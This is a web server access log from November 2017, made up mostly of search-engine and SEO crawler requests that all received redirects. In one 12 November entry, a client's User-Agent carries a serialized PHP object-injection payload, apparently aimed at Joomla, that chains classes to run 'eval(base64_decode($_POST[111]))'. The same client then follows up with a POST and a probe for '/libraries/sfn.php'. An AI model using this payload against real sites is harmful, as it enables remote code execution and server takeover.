66.249.79.95 - - [09/Nov/2017:23:00:47 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.233 - - [09/Nov/2017:23:57:51 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:00:07:49 -0800] "GET /img/wu-wei/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.65.6 - - [10/Nov/2017:00:20:34 -0800] "GET /img/mixman/16.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [10/Nov/2017:03:04:35 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:03:14:49 -0800] "GET /img/mixman/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
46.229.164.100 - - [10/Nov/2017:04:18:54 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
216.244.66.233 - - [10/Nov/2017:05:02:48 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:05:12:14 -0800] "GET /img/mixman/5.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.15.155 - - [10/Nov/2017:08:31:18 -0800] "GET /css/styles.css HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
188.226.129.55 - - [10/Nov/2017:09:20:58 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36"
95.85.10.113 - - [10/Nov/2017:10:06:04 -0800] "GET /robots.txt HTTP/1.0" 301 245 "-" "SafeDNSBot (https://www.safedns.com/searchbot)"
95.85.10.113 - - [10/Nov/2017:10:06:05 -0800] "GET / HTTP/1.0" 301 235 "-" "SafeDNSBot (https://www.safedns.com/searchbot)"
180.76.15.161 - - [10/Nov/2017:10:11:18 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.255.250.42 - - [10/Nov/2017:10:49:01 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [10/Nov/2017:10:49:01 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [10/Nov/2017:10:49:05 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.19 - - [10/Nov/2017:10:49:05 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.3 - - [10/Nov/2017:12:01:31 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.45 - - [10/Nov/2017:12:01:34 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [10/Nov/2017:14:06:16 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:14:18:36 -0800] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
40.77.167.45 - - [10/Nov/2017:14:34:27 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.62.252.162 - - [10/Nov/2017:16:06:33 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
64.62.252.162 - - [10/Nov/2017:16:06:34 -0800] "GET / HTTP/1.1" 301 235 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
216.244.66.233 - - [10/Nov/2017:17:43:58 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:17:54:15 -0800] "GET /img/autumn/4.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:17:54:18 -0800] "GET /img/bs4w/6.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
46.229.168.72 - - [10/Nov/2017:18:15:53 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
216.244.66.233 - - [10/Nov/2017:22:08:11 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
144.217.163.54 - - [10/Nov/2017:22:19:19 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
216.244.66.233 - - [10/Nov/2017:22:20:31 -0800] "GET /img/autumn/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:22:20:33 -0800] "GET /img/bs4w/8.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [10/Nov/2017:22:20:35 -0800] "GET /img/oncekids-fujimini/1.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
159.203.116.17 - - [10/Nov/2017:23:17:42 -0800] "GET / HTTP/1.0" 301 235 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
40.77.167.32 - - [10/Nov/2017:23:31:21 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [11/Nov/2017:00:24:42 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
164.132.162.160 - - [11/Nov/2017:00:26:00 -0800] "GET /img/mixman/7.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [11/Nov/2017:00:36:29 -0800] "GET /img/wu-wei/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
167.114.172.225 - - [11/Nov/2017:00:43:59 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Dataprovider.com;)"
216.244.66.233 - - [11/Nov/2017:01:30:49 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:01:39:21 -0800] "GET /img/bs4w/7.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:03:08:33 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:03:18:16 -0800] "GET /img/bs4w/3.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:03:32:43 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:03:43:17 -0800] "GET /img/sfnoir/9.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
151.80.27.116 - - [11/Nov/2017:04:59:45 -0800] "GET /img/sfnoir/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [11/Nov/2017:05:28:33 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:05:38:02 -0800] "GET /img/autumn/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:08:39:45 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:08:49:11 -0800] "GET /img/mixman/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
52.36.249.241 - - [11/Nov/2017:08:57:37 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.2"
216.244.66.233 - - [11/Nov/2017:09:01:14 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:09:07:20 -0800] "GET /img/oncekids-fujimini/8.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:09:43:11 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:09:48:38 -0800] "GET /img/mixman/15.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:09:48:41 -0800] "GET /img/sfnoir/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:10:04:01 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:10:11:43 -0800] "GET /img/mixman/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:10:11:46 -0800] "GET /img/wu-wei/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.240.236.119 - - [11/Nov/2017:12:42:47 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
216.244.66.233 - - [11/Nov/2017:12:43:04 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:12:49:12 -0800] "GET /img/oncekids-fujimini/6.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
40.77.167.64 - - [11/Nov/2017:13:13:09 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.215.93.126 - - [11/Nov/2017:13:15:35 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; http://spyonweb.com spyonweb@gmail.com"
34.215.93.126 - - [11/Nov/2017:13:15:35 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; http://spyonweb.com spyonweb@gmail.com"
51.255.65.66 - - [11/Nov/2017:13:35:56 -0800] "GET /img/oncekids-fujimini/5.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [11/Nov/2017:15:05:52 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:15:12:44 -0800] "GET /img/wu-wei/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
217.182.132.173 - - [11/Nov/2017:15:22:46 -0800] "GET /img/njn/1.jpg HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
144.217.243.211 - - [11/Nov/2017:16:14:46 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.165.29.122 - - [11/Nov/2017:16:16:27 -0800] "GET / HTTP/1.1" 301 235 "-" "-"
216.244.66.233 - - [11/Nov/2017:18:08:06 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [11/Nov/2017:18:16:41 -0800] "GET /img/mixman/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
5.196.87.42 - - [11/Nov/2017:19:43:21 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
217.182.132.178 - - [11/Nov/2017:19:43:25 -0800] "GET /img/autumn/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [11/Nov/2017:20:02:42 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.65.72 - - [11/Nov/2017:20:07:52 -0800] "GET /img/mixman/9.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [11/Nov/2017:20:08:26 -0800] "GET /img/mixman/5.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
76.218.219.53 - - [11/Nov/2017:20:37:51 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko)"
51.255.65.48 - - [11/Nov/2017:22:29:00 -0800] "GET /img/oncekids-fujimini/8.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
151.80.31.151 - - [11/Nov/2017:23:16:49 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
151.80.31.150 - - [11/Nov/2017:23:16:50 -0800] "GET /img/njn/6.jpg HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
156.67.106.49 - - [12/Nov/2017:02:11:50 -0800] "GET / HTTP/1.0" 301 235 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36"
142.54.180.122 - - [12/Nov/2017:03:46:28 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
142.54.180.122 - - [12/Nov/2017:03:46:29 -0800] "GET / HTTP/1.1" 301 235 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:54:\"eval(base64_decode($_POST[111]));JFactory::get();exit;\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}\xf0\x9d\x8c\x86"
142.54.180.122 - - [12/Nov/2017:03:46:29 -0800] "POST / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
142.54.180.122 - - [12/Nov/2017:03:46:29 -0800] "GET /libraries/sfn.php HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
216.244.66.233 - - [12/Nov/2017:05:59:22 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:06:08:18 -0800] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
151.80.31.151 - - [12/Nov/2017:08:32:58 -0800] "GET /img/njn/7.jpg HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [12/Nov/2017:09:30:48 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
217.182.72.199 - - [12/Nov/2017:09:31:15 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
216.244.66.233 - - [12/Nov/2017:09:40:24 -0800] "GET /img/autumn/4.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:09:40:28 -0800] "GET /img/bs4w/6.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
23.237.4.26 - - [12/Nov/2017:09:45:10 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
46.229.164.100 - - [12/Nov/2017:10:18:09 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
217.182.132.16 - - [12/Nov/2017:12:11:40 -0800] "GET /img/njn/5.jpg HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
5.255.250.42 - - [12/Nov/2017:13:59:47 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [12/Nov/2017:13:59:47 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [12/Nov/2017:13:59:51 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.19 - - [12/Nov/2017:13:59:51 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.233 - - [12/Nov/2017:14:06:22 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:14:21:13 -0800] "GET /img/autumn/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:14:21:15 -0800] "GET /img/bs4w/8.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:14:21:17 -0800] "GET /img/oncekids-fujimini/1.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:16:33:33 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
164.132.161.9 - - [12/Nov/2017:16:44:40 -0800] "GET /img/bs4w/5.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [12/Nov/2017:16:47:29 -0800] "GET /img/wu-wei/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:17:44:43 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:17:56:56 -0800] "GET /img/bs4w/7.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:19:18:52 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:19:28:14 -0800] "GET /img/bs4w/3.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:19:41:52 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.65.20 - - [12/Nov/2017:19:47:46 -0800] "GET /img/mixman/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [12/Nov/2017:19:50:34 -0800] "GET /img/sfnoir/9.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.27 - - [12/Nov/2017:20:12:37 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.164 - - [12/Nov/2017:20:12:42 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [12/Nov/2017:20:48:47 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:20:56:34 -0800] "GET /img/sfnoir/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:21:36:17 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:21:45:41 -0800] "GET /img/autumn/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [12/Nov/2017:23:50:57 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:00:01:23 -0800] "GET /img/oncekids-fujimini/2.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:01:04:26 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:01:12:13 -0800] "GET /img/oncekids-fujimini/8.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
164.132.161.59 - - [13/Nov/2017:01:35:00 -0800] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [13/Nov/2017:01:47:51 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:01:54:00 -0800] "GET /img/mixman/15.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:01:54:03 -0800] "GET /img/sfnoir/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:02:08:45 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:02:14:41 -0800] "GET /img/mixman/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:02:14:43 -0800] "GET /img/wu-wei/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.65.45 - - [13/Nov/2017:04:28:52 -0800] "GET /img/mixman/17.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
